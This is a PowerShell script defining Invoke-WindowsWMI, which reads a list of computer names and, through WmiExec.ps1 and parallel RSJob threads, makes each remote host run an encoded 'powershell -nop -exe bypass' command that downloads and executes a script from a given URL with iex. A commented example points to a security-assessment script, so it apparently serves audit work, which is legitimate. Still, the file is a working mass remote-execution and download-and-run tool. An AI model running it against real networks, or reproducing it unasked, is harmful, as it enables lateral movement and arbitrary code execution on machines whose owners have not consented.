#Multi Threading :D
#Install-Module -Name PoshRSJob -Force
#Maybe need manually import of wmiexec.ps1
. $PSScriptRoot\WmiExec.ps1
function Invoke-WindowsWMI{
    #Todo: Add support for local scripts
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",
        
        [Parameter(Mandatory=$true)]
        $Url
    )
    #Import ComputerNames
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
        . $PSScriptRoot\WmiExec.ps1
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Make sure Invoke-WMIExec is imported
    $wmi=(Get-ChildItem function: | where {$_.name -like 'Invoke-WMIExec'})
    if(-not($wmi)){
        Write-Host "Please import WmiExec.ps1 manually"
        Write-Host ". .\WmiExec.ps1"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (new-object net.webclient).downloadstring('$Url')"))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Url' = $Enc
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad 'Invoke-WMIExec' -ScriptBlock {
            param($Inputargs)
            $Location = $Inputargs.Location
            $Url = $Inputargs.Url
            Start-Transcript -Path "$Location\$($_)"
            Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Url"
            Stop-Transcript
    } | Wait-RSJob -ShowProgress
    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Host "[-] Failed connecting to following hosts" -ForegroundColor Red
        Write-Output $errors
    }
}
#Invoke-WindowsWMI -Url 'https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing/chaps.ps1'